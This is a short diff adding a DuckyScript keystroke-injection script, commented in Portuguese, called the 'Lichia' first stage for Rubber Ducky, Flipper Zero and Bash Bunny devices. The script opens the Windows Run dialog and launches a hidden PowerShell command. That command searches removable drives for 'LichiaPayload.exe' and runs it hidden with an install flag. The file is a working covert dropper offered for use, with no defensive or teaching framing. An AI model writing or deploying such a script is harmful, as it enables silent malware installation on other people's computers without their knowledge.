@@ -1,0 +1,8 @@
+REM Lichia — first stage HID. abre o executar, varre drives removiveis, roda o bootstrap
+REM funciona em Rubber Ducky, Flipper Zero, Bash Bunny. adapte o DELAY ao SO alvo.
+DELAY 2000
+ESCAPE
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -c "Get-Volume | ? DriveType -eq 2 | % { $p = Join-Path (Join-Path $_.DriveLetter ':') 'Lichia\\LichiaPayload.exe'; if (Test-Path $p) { Start-Process $p '--install' -w h } }"
+ENTER
